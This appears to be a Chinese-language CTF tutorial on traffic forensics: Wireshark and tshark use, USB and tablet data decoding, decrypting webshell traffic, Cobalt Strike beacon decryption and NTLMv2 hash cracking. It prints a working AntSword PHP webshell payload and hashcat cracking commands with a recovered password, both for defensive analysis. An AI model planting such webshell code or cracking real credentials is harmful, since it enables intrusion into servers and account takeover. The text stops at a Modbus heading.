> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [goodlunatic.github.io](https://goodlunatic.github.io/posts/5422d65/#ntlm%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90)

> This is a Simple Guide for Network Traffic Analysis.

**This is a Simple Guide for Network Traffic Analysis.**

拿到流量包后，第一件事就是可以先 strings | grep flag{ 一下，说不定 flag 就直接出了

当然也可以使用凤二西师傅的 破空_flag 查找工具 3.5.exe 来搜索 flag

[](#wireshark%e5%9f%ba%e7%a1%80)WireShark 基础
--------------------------------------------

刚刚接触流量分析的同学可能会不太清楚 wireshark 的过滤器如何使用

但是用熟悉了其实很简单

常见的协议比如 http ，常用的有下面这些参数，其实只要在过滤器中输入 http. 它就会自动提示你了

```
http.request.method == "POST"
http.request.full_uri == “XXX”
......
```

还有一些比较常用的

```
# 包含什么内容的帧
frame contains "XXX"
```

其实这里可以直接右击想要过滤的字段，然后作为过滤器选中，上面就会自己跳出来过滤的表达式了（这里也可以使用或选中和且选中）

有了这个表达式，就可以带入下面的 tshark 命令一键提取所有过滤出来的帧的指定字段的数据了

![](https://goodlunatic.github.io/posts/5422d65/imgs/N1.png)

[](#tshark%e4%bd%bf%e7%94%a8%e6%95%99%e7%a8%8b)tshark 使用教程
----------------------------------------------------------

导出流量包中所有 POST 数据包的 data 数据

```
tshark -r 1.pcapng -Y "http.request.method == POST" -T fields -e data.data > data.txt
# -r [输入的pcap文件路径]: 指定要分析的pcap文件。
# -Y "http.request.method == POST": 使用一个显示过滤器只显示POST请求。
# -T fields: 输出指定的字段数据。
# -e http.file_data: 输出HTTP负载的数据。
```

导出 HTTP 数据包中所有的数据

```
tshark -r 1.pcapng -Y "http" -T fields -e http.file_data > data.txt
```

可以使用 uniq 参数去除重复行

```
tshark -r 1.pcapng -Y "dns" -T fields -e dns.qry.name | uniq  > data.txt
```

[](#%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90%e5%9f%ba%e7%a1%80%e8%80%83%e7%82%b9)流量分析基础考点
-------------------------------------------------------------------------------------

### [](#1wireshark%e6%8f%90%e5%8f%96%e6%95%b0%e6%8d%ae%e6%b5%81)1、wireshark 提取数据流:

可以用 tcpxtract 工具：tcpxtract -f 1.pcap

strings webshell.pcapng | grep {

// 打印出文件中所有可打印字符

### [](#2%e5%8d%8f%e8%ae%ae%e5%88%86%e7%ba%a7%e5%af%bc%e5%87%bahttp%e5%af%b9%e8%b1%a1)2、协议分级 + 导出 HTTP 对象

### [](#2%e6%b5%81%e9%87%8f%e5%8c%85%e7%ab%af%e5%8f%a3%e9%9a%90%e5%86%99%e5%8f%af%e8%83%bd%e4%bc%9a%e6%9c%8901%e4%ba%92%e6%8d%a2)2、流量包端口隐写（可能会有 01 互换）

### [](#3tcpftp%e5%8d%8f%e8%ae%ae%e4%bc%a0%e8%be%93%e6%96%87%e4%bb%b6binwalk%e5%92%8cforemost%e9%83%bd%e6%b2%a1%e7%94%a8)3、TCP/FTP 协议传输文件 (binwalk 和 foremost 都没用)：

1、直接用 wireshark 导出为 pcap 文件然后用 networkminer 分析

2、拉入 kali 用 tcpxtract 提取文件：tcpxtract -f + 文件名. pcap

3、直接追踪流提取 16 进制，根据文件头尾提取出文件

### [](#4%e6%9c%89%e6%97%b6%e5%80%99%e5%8f%af%e8%83%bd%e9%9c%80%e8%a6%81%e5%88%86%e7%89%88%e6%9c%ac%e5%88%86%e5%88%ab%e5%af%bc%e5%87%ba)4、有时候可能需要分版本分别导出

### [](#5%e5%8f%af%e8%83%bd%e5%8f%af%e4%bb%a5%e7%9b%b4%e6%8e%a5%e6%90%9c%e7%b4%a2flag%e6%98%8e%e6%96%87%e6%88%96%e8%80%85%e7%bc%96%e7%a0%81%e5%8a%a0%e5%af%86%e8%bf%87%e7%9a%84flag)5、可能可以直接搜索 flag 明文或者编码加密过的 flag

搜索 flag 脚本，待改进。。。

```
#Python2 的脚本
# encoding:utf-8
import os
import os.path
import sys
import subprocess

#打印可打印字符串
def str_re(str1):
    str2=""
    for i in str1.decode('utf8','ignore'):
        try:
            #print(ord(i))
            if ord(i) <= 126 and ord(i) >= 33:
                str2 += i
        except:
                str2 += ""
    #print(str2)
    return str2


#写入文本函数
def txt_wt(name,txt1):
    with open("output.txt","a") as f:
        f.write('filename:'+name)
        f.write("\n")
        f.write('flag:'+txt1)
        f.write("\n")

#第一次运行，清空output文件
def clear_txt():
    with open("output.txt","w") as f:
        print "clear output.txt！！！"

# 递归遍历的所有文件
def file_bianli():
    # 路径设置为当前目录
    path = os.getcwd()
    # 返回文件下的所有文件列表
    file_list = []
    for i, j, k in os.walk(path):
        for dd in k:
            if ".py" not in dd  and "output.txt" not in dd:
                file_list.append(os.path.join(i, dd))
    return file_list

#查找文件中可能为flag的字符串

def flag(file_list,flag):
    for i in file_list:
        try:
            with open(i,"rb") as f:
                for j in f.readlines():
                    j1=str_re(j)#可打印字符串
                    #print j1
                    for k in flag:
                        if k in j1:
                            txt_wt(i, j1)
                            print 'filename:',i
                            print 'flag:',j1
        except:
            print 'err'

flag_txt = ['flag{', '666c6167','flag','Zmxh','f', '666C6167']

#清空输出的文本文件
clear_txt()
#遍历文件名
file_lt=file_bianli()
#查找flag关键字
flag(file_lt,flag_txt)
```

[](#usb%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)USB 流量分析
----------------------------------------------------

4 字节为鼠标流量，8 字节为键盘流量。

数据部分在 Leftover Capture Data 域中

### [](#%e9%94%ae%e7%9b%98%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)键盘流量分析

例题 5：键盘流量分析

先在 wsl 或者别的虚拟机中用 tshark 提取数据

```
#提取数据的命令，这里用正则表达式剔除了空行
tshark -r usb.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' > usbdata.txt
# -r 指定了需要读取的文件
# -T 表示仅仅输出所选字段
# -e 指定提取的字段
# 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）
```

Tips：老版本的 tshark 提取数据是有冒号的，新版本就没有冒号了，所以需要我们自己添加冒号

```
#给键盘流量数据添加冒号.py
f = open('usbdata.txt', 'r')
fi = open('out.txt', 'w')
while 1:
    a = f.readline().strip()
    if a:
        if len(a) == 16:  # 鼠标流量的话len改为8
            out = ''
            for i in range(0, len(a), 2):
                if i + 2 != len(a):
                    out += a[i] + a[i + 1] + ":"
                else:
                    out += a[i] + a[i + 1]
            fi.write(out)
            fi.write('\n')
    else:
        break

fi.close()
```

加完冒号以后我们就可以直接用脚本翻译数据了

```
#翻译键盘数据1.py
normalKeys={"04":"a","05":"b","06":"c","07":"d","08":"e","09":"f","0a":"g","0b":"h","0c":"i","0d":"j","0e":"k","0f":"l","10":"m","11":"n","12":"o","13":"p","14":"q","15":"r","16":"s","17":"t","18":"u","19":"v","1a":"w","1b":"x","1c":"y","1d":"z","1e":"1","1f":"2","20":"3","21":"4","22":"5","23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>","2b":"\t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>","3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys={"04":"A","05":"B","06":"C","07":"D","08":"E","09":"F","0a":"G","0b":"H","0c":"I","0d":"J","0e":"K","0f":"L","10":"M","11":"N","12":"O","13":"P","14":"Q","15":"R","16":"S","17":"T","18":"U","19":"V","1a":"W","1b":"X","1c":"Y","1d":"Z","1e":"!","1f":"@","20":"#","21":"$","22":"%","23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>","2b":"\t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>","3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
output = []
keys = open('out.txt')
for line in keys:
    try:
        if line[0] != '0' or (
                line[1] != '0' and line[1] != '2'
        ) or line[3] != '0' or line[4] != '0' or line[9] != '0' or line[
                10] != '0' or line[12] != '0' or line[13] != '0' or line[
                    15] != '0' or line[16] != '0' or line[18] != '0' or line[
                        19] != '0' or line[21] != '0' or line[
                            22] != '0' or line[6:8] == "00":
            continue
        if line[6:8] in normalKeys.keys():
            output += [[normalKeys[line[6:8]]],
                       [shiftKeys[line[6:8]]]][line[1] == '2']
        else:
            output += ['[unknown]']
    except:
        pass

keys.close()

flag = 0
print("".join(output))
for i in range(len(output)):
    try:
        a = output.index('<DEL>')
        del output[a]
        del output[a - 1]
    except:
        pass

for i in range(len(output)):
    try:
        if output[i] == "<CAP>":
            flag += 1
            output.pop(i)
            if flag == 2:
                flag = 0
        if flag != 0:
            output[i] = output[i].upper()
    except:
        pass

print('output :' + "".join(output))
```

```
#翻译键盘数据2.py
mappings={0x04:"A",0x05:"B",0x06:"C",0x07:"D",0x08:"E",0x09:"F",0x0A:"G",0x0B:"H",0x0C:"I",0x0D:"J",0x0E:"K",0x0F:"L",0x10:"M",0x11:"N",0x12:"O",0x13:"P",0x14:"Q",0x15:"R",0x16:"S",0x17:"T",0x18:"U",0x19:"V",0x1A:"W",0x1B:"X",0x1C:"Y",0x1D:"Z",0x1E:"1",0x1F:"2",0x20:"3",0x21:"4",0x22:"5",0x23:"6",0x24:"7",0x25:"8",0x26:"9",0x27:"0",0x28:"\n",0x2a:"[DEL]",0X2B:"",0x2C:"",0x2D:"-",0x2E:"=",0x2F:"[",0x30:"]",0x31:"\\",0x32:"~",0x33:";",0x34:"'",0x36:",",0x37:"."}
nums = []
keys = open('out.txt')
for line in keys:
    if line[0] != '0' or line[1] != '0' or line[3] != '0' or line[
            4] != '0' or line[9] != '0' or line[10] != '0' or line[
                12] != '0' or line[13] != '0' or line[15] != '0' or line[
                    16] != '0' or line[18] != '0' or line[19] != '0' or line[
                        21] != '0' or line[22] != '0':
        continue
    nums.append(int(line[6:8], 16))

keys.close()

output = ""
for n in nums:
    if n == 0:
        continue
    if n in mappings:
        output += mappings[n]
    else:
        output += '[unknown]'

print('output :\n' + output)
```

提取出来的数据如果有 <SPACE><DEL><RET>, 我们可以用 vscode 中的正则匹配来替换他们

### [](#%e9%bc%a0%e6%a0%87%e6%b5%81%e9%87%8f)鼠标流量

例题 6：键盘流量分析

前两步和键盘流量一样，提取数据并加冒号，但是这里要注意判断数据的长度

```
#给数据添加冒号.py
f = open('usbdata.txt', 'r')
fi = open('out.txt', 'w')
while 1:
    a = f.readline().strip()
    if a:
        if len(a) == 8:  # 键盘流量的话len改为16
            out = ''
            for i in range(0, len(a), 2):
                if i + 2 != len(a):
                    out += a[i] + a[i + 1] + ":"
                else:
                    out += a[i] + a[i + 1]
            fi.write(out)
            fi.write('\n')
    else:
        break

fi.close()
```

根据加完冒号的数据获取坐标

```
#获取鼠标坐标.py
nums = []
keys = open('out.txt','r')
f = open('xy.txt','w')
posx = 0
posy = 0
for line in keys:
    if len(line) != 12 :
        continue
    x = int(line[3:5],16)
    y = int(line[6:8],16)
    if x > 127 :
        x -= 256
    if y > 127 :
        y -= 256
    posx += x
    posy += y
    btn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing
    if btn_flag == 1 : # 1 代表左键
        f.write(str(posx))
        f.write(' ')
        f.write(str(posy))
        f.write('\n')

f.close()
```

之后可以用 gnuplot 或者用 python 脚本画图

```
#gnuplot画图命令
gnuplot> plot "xy.txt"
```

```
#根据坐标画图.py
import matplotlib.pyplot as plt
import numpy as np

x, y = np.loadtxt('xy.txt', delimiter=' ', unpack=True)
plt.plot(x, y, '.')
plt.show()
```

如果图片是反的或者是镜像的，可以用美图秀秀或者 PS 处理一下

### [](#%e6%80%bb%e7%bb%93%e4%b8%80%e4%b8%8b%e6%88%91%e7%9a%84%e5%81%9a%e9%a2%98%e6%ad%a5%e9%aa%a4wsl)总结一下我的做题步骤（WSL）：

**一、先用 wireshark 查看流量包，看看是键盘流量还是鼠标流量（有可能二者都有哦）**

**二、用 tshark 提取数据**

**三、用脚本添加冒号**

**四、翻译文字并处理或者提取坐标画图**

[](#%e6%95%b0%e4%bd%8d%e6%9d%bf%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)数位板流量分析：
----------------------------------------------------------------------------

[例题 1-2022 浙江省赛决赛 - hard_Digital_plate](https://goodlunatic.github.io/posts/3f7db4e/#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-hard_digital_plate)

例题 2-RoarCTF MISC Davinci_Cipher

```
# 先导出数据并去除空行
tshark -r hard_Digital_plate.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' > out.txt
# -r 指定了需要读取的文件
# -T 表示仅仅输出所选字段
# -e 指定提取的字段
# 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）
```

类似于：

```
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08813708951e650000000000
08813808951ec10000000000
08813908951e2e0100000000
08813a08951e940100000000
08813b08951ee20100000000
08813c08951e1c0200000000
08813c08951e440200000000
08813c08951e610200000000
```

需要我们根据设备的传输协议来分析出对应的 xy 坐标以及压感数据

```
#数位板低压感数据分析.py
nums = []
keys = open('out.txt', 'r')
result = open('xy.txt', 'w')
for line in keys:
    if int(line[12:16], 16) == 0:
        continue
    x = int(line[4:6], 16) + int(line[6:8], 16) * 0xff
    y = int(line[8:10], 16) + int(line[10:12], 16) * 0xff
    if int(line[12:16], 16) < 0xf000:
        result.write(str(x)+' '+str(-y)+'\n')
keys.close()
result.close()
```

```
import matplotlib.pyplot as plt


press_lst = []

with open("out.txt","r") as f:
    lines = f.readlines()

def draw_pic1():
    x = []
    y = []
    for line in lines:
        if(int(line[12:16],16) != 0):
            press_data = int(line[12:16],16)
            x.append(int(line[6:8],16)*0xff+int(line[4:6],16))
            y.append(int(line[10:12],16)*0xff+int(line[8:10],16))
            
    plt.scatter(x,y)
    plt.grid() # 显示网格
    plt.show()

def draw_pic2():
    x = []
    y = []
    for line in lines:
        if(int(line[12:16],16) != 0):
            press_data = int(line[12:16],16)
            press_lst.append(press_data)
            if(press_data < 65000):
                x.append(int(line[6:8],16)*0xff+int(line[4:6],16))
                y.append(-1 * (int(line[10:12],16)*0xff+int(line[8:10],16)))
            
    plt.scatter(x,y)
    plt.grid() # 显示网格
    plt.show()
    
if __name__ == "__main__":
    draw_pic1()
    draw_pic2()
    print(press_lst)
```

[](#sql%e6%b3%a8%e5%85%a5%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)SQL 注入流量分析
------------------------------------------------------------------------

可以使用 wireshark 的过滤器过滤出注入的流量，然后导出特定分组

然后使用 tshark 根据字段名提取出所有的注入语句

如果是盲注的话，直接写个正则匹配脚本提取数据即可

例题 1-2023 铁三 traffic

[](#webshell%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)Webshell 流量分析
--------------------------------------------------------------

Tips：如果返回的响应数据是 gzip 格式，要注意提取的位置，gzip 数据一般是以 1F 8B 08 00 开头的

### [](#%e8%8f%9c%e5%88%80%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)菜刀流量分析

在 TCP 和 HTTP 协议中寻找线索，找返回包中一大串的数据，并根据标志位判断文件类型 如果是加密了的压缩包，看看是不是伪加密

### [](#%e5%93%a5%e6%96%af%e6%8b%89%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)哥斯拉流量分析

#### [](#303%e7%89%88%e6%9c%ac)3.03 版本

哥斯拉的连接需要填写密码和密钥，加密过程中使用的是密钥 MD5 的前 16 位

**Request 解密脚本**

```
<?php

function encode($D,$K){
    for($i=0;$i<strlen($D);$i++){
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}

$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';

echo encode(base64_decode(urldecode('')),$key);
//有时候Request解密也需要gzdecode
echo gzdecode(encode(base64_decode(urldecode('')), $key));
```

**Response 解密脚本**

```
<?php
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++){
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}

$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
// 原来的数据去掉前十六位和后十六位然后解密
echo gzdecode(encode(base64_decode('DlMRWA1cL1gOVDc2MjRhRwZFEQ=='),$key));
```

**解密的例子**

request 解密

```
echo encode(base64_decode(urldecode('DlMRWA1cL1gOVDc%2FMjRhVAZCJ1ERUQJKKl9TXQ%3D%3D')), $key);
//getBasicsInfo

echo gzdecode(encode(base64_decode(urldecode('fL1tMGI4YTljMSj8jz6jA3d2hOK3r9ldE1qWHCQw5iUyciHYwoApdQ2q4%2B6UwuZnokGyih%2BkiHExtpdwzdcYbcgX9fDGOqekEG0dGJhlwPAYnbSoMmLbfNCAAOREiM6%2BdrzW5dmQQHmrvf3x40sVcGT3bOqpDSpn2IV5%2FP0YvGN9oTSJH9QUJk5U6Ro0v5RHLe4Mm%2By6saafb0Vyq2xDYsoZK0TfoMI5YzE%3D')), $key));
/**cmdLine}sh -c "cd "/www/admin/www.webshell.com_80/wwwroot/upload/";zip -e flag.zip flag.txt -P sXZfCyHSjCWqfSSEmgBj8jGkJhu87cBrd" 2>&1methodName
execCommand**/
```

Response 解密

```
echo gzdecode(encode(base64_decode(urldecode('fL1tMGI4YTljMn75e3i2GMoehBqscKzwshr9GtI2YQRVyPwjYjhh')), $key));
//flag.txt shell.php
```

### [](#%e5%86%b0%e8%9d%8e%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)冰蝎流量分析

简要加密过程（请求）

base64 -> AES(key = ？？？ IV = 0123456789abcdef) -> base64 有时候 IV = \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 简要解密过程（响应）

解密过程反过来即可

从流量包中的 HTTP 数据包中获取 key 和 data，然后用 CyberChef 解密即可

![](https://goodlunatic.github.io/posts/5422d65/imgs/N2.png)

![](https://goodlunatic.github.io/posts/5422d65/imgs/N3.png)

![](https://goodlunatic.github.io/posts/5422d65/imgs/N4.png)

这里如果想要偷懒，对于冰蝎和哥斯拉流量可以直接用 风二西 师傅的 承影_哥斯拉冰蝎解码工具 一把梭了

直接将木马中的密钥复制到工具中，然后 Ctrl+A 全选加密的数据，再右键选择对应的解密方式即可

![](https://goodlunatic.github.io/posts/5422d65/imgs/N5.png)

### [](#%e8%9a%81%e5%89%91%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)蚁剑流量分析

蚁剑流量分析需要注意的地方：

1、路径 base64 字符串需要去除前两个字符后再解码

2、响应数据的头尾有额外的字符，需要先去除然后再 base64 解码

蚁剑 webshell 样本

```
<?php
// 设置一些PHP配置
@ini_set("display_errors", "0"); // 关闭显示错误信息
@set_time_limit(0); // 设置脚本执行时间为无限制
// 获取open_basedir配置
$opdir = @ini_get("open_basedir");
// 如果open_basedir配置存在
if ($opdir) {
    // 获取当前脚本所在目录
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    // 将open_basedir路径分割成数组
    // /;|:/
    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
    // 将当前目录和系统临时目录添加到数组中
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    // 遍历open_basedir数组
    foreach ($oparr as $item) {
        // 如果目录不可写，继续下一个目录
        if (!@is_writable($item)) {
            continue;
        }
        // 创建一个临时目录
        $tmdir = $item . "/.573ef8c9dd12";
        @mkdir($tmdir);
        // 如果目录创建失败，继续下一个目录
        if (!@file_exists($tmdir)) {
            continue;
        }
        // 获取临时目录的真实路径
        $tmdir = realpath($tmdir);
        // 切换到临时目录
        @chdir($tmdir);
        // 修改open_basedir配置，使其可以访问上层目录
        @ini_set("open_basedir", "..");
        // 获取目录路径的数组
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        // 逐级返回上层目录，以还原open_basedir配置
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        }
        // 恢复open_basedir配置为根目录
        @ini_set("open_basedir", "/");
        // 删除临时目录
        @rmdir($tmdir);
        // 跳出循环，只操作第一个可写目录
        break;
    }
}
// 自定义函数，对输出进行base64编码
function asenc($out)
{
    return @base64_encode($out);
}
// 自定义函数，获取输出缓冲区内容并进行处理
function asoutput()
{
    $output = ob_get_contents(); // 获取输出缓冲区内容
    ob_end_clean(); // 清空输出缓冲区
    // 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在
    echo "fb708664";
    echo @asenc($output);
    echo "870b983ed5";
}
// 开始输出缓冲区
ob_start();
try {
    // 解码POST请求中的文件路径和内容
    // 从这个变量的值中取出从第二个字符开始到最后的子字符串，蚁剑需要去除前两个字母的原因所在
    $f = base64_decode(substr($_POST["idb82191cedb24"], 2));
    $c = $_POST["e748c4dcd196bb"];
    $c = str_replace("\r", "", $c);
    $c = str_replace("\n", "", $c);
    $buf = "";
    // 将内容进行URL解码
    for ($i = 0; $i < strlen($c); $i += 2) {
        $buf .= urldecode("%" . substr($c, $i, 2));
    }
    // 将解码后的内容写入文件，并返回结果
    echo (@fwrite(fopen($f, "a"), $buf) ? "1" : "0");
} catch (Exception $e) {
    // 如果发生异常，输出错误信息
    echo "ERROR://" . $e->getMessage();
}
// 调用自定义函数处理输出
asoutput();
// 终止脚本执行
die();
?>
```

这里总结一下我手动分析蚁剑流量的步骤：

1、首先 url 解码请求包，然后 base64 解码其中的 php 文件和该文件执行的命令

2、找到 php 文件中 asoutput 函数的标识字符串

```
function asoutput()
{
    $output = ob_get_contents(); // 获取输出缓冲区内容
    ob_end_clean(); // 清空输出缓冲区
    // 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在
    echo "fb708664";
    echo @asenc($output);
    echo "870b983ed5";
}
```

3、根据 gzip 的文件头提取响应包，去除标识字符串后 base64 解码得到响应数据

4、按照上面的步骤逐个分析流量包

### [](#cobalstrike%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)CobalStrike 流量分析

先从流量包中导出 key 文件

然后在 cs-scripts 中运行 python3 parse_beacon_keys.py 得到私钥

```
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT+pVELCnX1r
To4LhSzcP7sPOrIOQg0onSpKO1tzOVX+2DqtZsSFoFrAmrEV+gZCbFfhYR9vs5DGLUg9aa0i5Gqh
Pz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN+wOYZEorInV9gPkCJdAgMBAAEC
gYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5V
r7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ+rYnCezQcrt4V3c7BZtW9RjFW
vHh09PF808Yl4/+++vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL
3MK+EtafnYIDD1IS+97K0cbg922RKXNdv+kCQQDWJk0kNe8ePBpwJU4slig1Y+4VWuwTRz6r+MNp
v+WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG
9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB+aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3C
dsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJB
AIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2
ddsyNI6XbCU=
-----END PRIVATE KEY-----
```

在数据包的 HTTP 请求中获得 Cookie，然后修改 CS_Decrypt 中的 Beacon_metadata_RSA_Decrypt.py 的私钥和 Cookie

运行即可得到 AES 和 HMAC key

```
AES key:ef08974c0b06bd5127e04ceffe12597b
HMAC key:bd87fa356596a38ac3e3bb0b6c3496e9
```

然后把这两个 key 填入 Beacon_Task_return_AES_Decrypt.py 中

把流量包中的 POST 数据包中的 data 的值用 CyberChef (from hex+to base64) 处理后得到的数据填入上面那个脚本中

一个个解密每个 POST 数据包中的 data 即可得到 flag

[](#ntlm%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)NTLM 流量分析
------------------------------------------------------

NTLM 流量分析需要的信息，在追踪流中是找不到的，需要我们深入分析具体的每个流量包

可以用关键字 ntlmssp 过滤流量包，然后看每个流量包右侧的 info 栏快速定位 NTLM 信息的位置

### [](#%e6%8f%90%e5%8f%96-ntlmv2-%e5%93%88%e5%b8%8c%e5%80%bc%e5%b9%b6%e7%a0%b4%e8%a7%a3smb%e5%8d%8f%e8%ae%ae)提取 NTLMv2 哈希值并破解（SMB 协议）

首先，使用关键字 ntlmssp 对流量包进行筛选并定位到认证成功的 NTLMSSP_AUTH 包 打开流量包中的 Security Blob 层 复制用户名、域名

然后，分析 NTLM 响应部分，找到 NTProofStr 字段和 NTLMv2 的响应，将它们作为十六进制字符串复制到文本文档中 NTLMv2 Response 是从 ntlmProofStr 开始，因此从 NTLMv2 的响应中要删除 ntlmProofStr。

最后，在过滤器中输入 ntlmssp.ntlmserverchallenge，查找 NTLM Server Challenge 字段，通常这个数据包是在 NTLM_Auth 数据包之前，将该值作为十六进制字符串复制到文本文档。

把上面三部分的参数按以下格式保存到 hash.txt

```
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response
```

```
administrator::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000
```

最后使用 hashcat 进行爆破

```
hashcat -m 5600 hash.txt rockyou.txt
```

```
$ hashcat -m 5600 hash.txt rockyou.txt --show
ADMINISTRATOR::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000:qwe123!@#
```

### [](#%e6%8f%90%e5%8f%96-ntlmv2-%e5%93%88%e5%b8%8c%e5%80%bc%e5%b9%b6%e7%a0%b4%e8%a7%a3http%e5%8d%8f%e8%ae%ae)提取 NTLMv2 哈希值并破解（HTTP 协议）

大致步骤和 SMB 协议的差不多，就是 NTLM 信息放在了 hypertext transport protocol 中 按照之前的步骤提取出来，然后 hashcat 爆破即可

```
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response
```

```
jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000
```

### [](#%e6%8f%90%e5%8f%96-ntlmv2-%e5%93%88%e5%b8%8c%e5%80%bc%e5%b9%b6%e7%a0%b4%e8%a7%a3smtp%e5%8d%8f%e8%ae%ae)提取 NTLMv2 哈希值并破解（SMTP 协议）

这里的 NTLM 流量信息可能 base64 编码过了，所以分析前需要 base64 解码：

![](https://goodlunatic.github.io/posts/5422d65/imgs/N6.png)

后续步骤就和之前一样了，提取信息然后用 hashcat 爆破

[](#%e5%b7%a5%e6%8e%a7%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)工控流量分析
-----------------------------------------------------------------

参考连接：https://blog.csdn.net/song123sh/article/details/128387982

将流量按长度降序排列，然后在各层寻找线索，

显示分组字节，从 base64 后开始，然后解码看文件类型，最后显示成该类型

### [](#modbus-%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90)Modbus 协议分析

Modbus 流量主要有三类：Modbus/RTU、Modbus/ASCII、Modbus/TCP

**Modbus/RTU**

> 从机地址 1B + 功能码 1B + 数据字段 xB+CRC 值 2B 最大长度 256B，所以数据字段最大长度 252B

**Modbus/ASCII**

